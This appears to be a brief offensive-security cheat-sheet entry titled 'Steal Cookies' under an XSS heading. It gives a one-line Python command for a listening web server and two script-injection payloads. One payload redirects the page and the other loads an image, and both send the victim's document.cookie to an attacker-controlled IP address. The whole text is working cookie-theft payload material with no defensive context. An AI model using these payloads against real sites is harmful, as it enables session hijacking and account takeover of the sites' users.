XSS
==================
Steal Cookies
-----------------------
```
# Start Web Server
python -m SimpleHTTPServer 80

<script>document.location="http://192.168.0.60/?c="+document.cookie;</script>
<script>new Image().src="http://192.168.0.60/index.php?c="+document.cookie;</script>
```
